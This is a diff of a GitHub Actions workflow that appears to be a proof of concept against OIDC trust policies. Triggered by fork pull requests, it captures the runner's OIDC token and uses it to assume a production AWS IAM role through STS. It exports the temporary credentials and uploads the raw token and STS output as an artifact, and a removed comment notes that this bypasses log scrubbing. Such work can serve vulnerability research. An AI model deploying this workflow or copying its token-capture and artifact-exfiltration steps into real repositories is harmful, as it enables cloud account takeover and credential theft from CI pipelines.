@@ -2,6 +2,7 @@ name: OIDC PR Target Full Token
 on:
   pull_request_target:
     types: [opened, synchronize, reopened]
+  workflow_dispatch:
 permissions:
   id-token: write
   contents: read
@@ -10,38 +11,49 @@ jobs:
     runs-on: ubuntu-latest
     environment: production
     steps:
-      - name: Get OIDC Full JWT and save to artifact
+      - name: Capture OIDC JWT and decode payload
         run: |
           FULL_JWT=$(curl -sS \
             -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
-          
-          # Save full token to file (artifact upload bypasses log scrubbing)
           echo "$FULL_JWT" > /tmp/oidc_token.txt
-          
-          # Print decoded payload
           PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
-          echo "=== DECODED SUB CLAIM ==="
+          echo "=== OIDC Token Payload ===" 
           echo "$PAYLOAD" | python3 -c "
           import sys, base64, json
           d = sys.stdin.read().strip()
           p = d + '=' * (4 - len(d) % 4)
-          data = json.loads(base64.urlsafe_b64decode(p))
-          print(json.dumps({k: data[k] for k in ['sub','ref','event_name','job_workflow_ref'] if k in data}, indent=2))
-          "
-          
-          # Attempt actual STS assume-role-with-web-identity
-          # Using a trust policy that matches our exact sub claim
-          echo ""
-          echo "=== STS ATTEMPT (will fail without matching role but shows the request) ==="
-          aws sts assume-role-with-web-identity \
-            --role-arn "arn:aws:iam::123456789012:role/GitHubOIDCTestRole" \
-            --role-session-name "GitHubOIDCBypassPoC" \
-            --web-identity-token "$FULL_JWT" 2>&1 || true
+          print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))"
 
-      - name: Upload OIDC token as artifact
-        uses: actions/upload-artifact@v4
+      - name: Assume AWS IAM Role using spoofed OIDC token
+        run: |
+          FULL_JWT=$(cat /tmp/oidc_token.txt)
+          echo "=== Calling aws sts assume-role-with-web-identity ==="
+          STS_RESULT=$(aws sts assume-role-with-web-identity \
+            --role-arn "arn:aws:iam::274196201170:role/GitHubOIDC-ProdDeployment-VulnPoC" \
+            --role-session-name "attacker-fork-pr-session" \
+            --web-identity-token "$FULL_JWT" \
+            --duration-seconds 900 2>&1) || true
+          echo "$STS_RESULT"
+          echo "$STS_RESULT" > /tmp/sts_result.txt
+          # Extract temp credentials if successful
+          ACCESS_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.AccessKeyId // empty' 2>/dev/null)
+          if [ -n "$ACCESS_KEY" ]; then
+            echo "=== ROLE ASSUMED SUCCESSFULLY ==="
+            export AWS_ACCESS_KEY_ID=$(echo "$STS_RESULT" | jq -r '.Credentials.AccessKeyId')
+            export AWS_SECRET_ACCESS_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.SecretAccessKey')
+            export AWS_SESSION_TOKEN=$(echo "$STS_RESULT" | jq -r '.Credentials.SessionToken')
+            echo "=== aws sts get-caller-identity (as assumed role) ===" 
+            aws sts get-caller-identity | tee /tmp/caller_identity.txt
+          fi
+        env:
+          AWS_DEFAULT_REGION: us-east-1
+
+      - uses: actions/upload-artifact@v4
         with:
-          name: oidc-token-poc
-          path: /tmp/oidc_token.txt
+          name: oidc-aws-poc
+          path: |
+            /tmp/oidc_token.txt
+            /tmp/sts_result.txt
+            /tmp/caller_identity.txt
           retention-days: 1
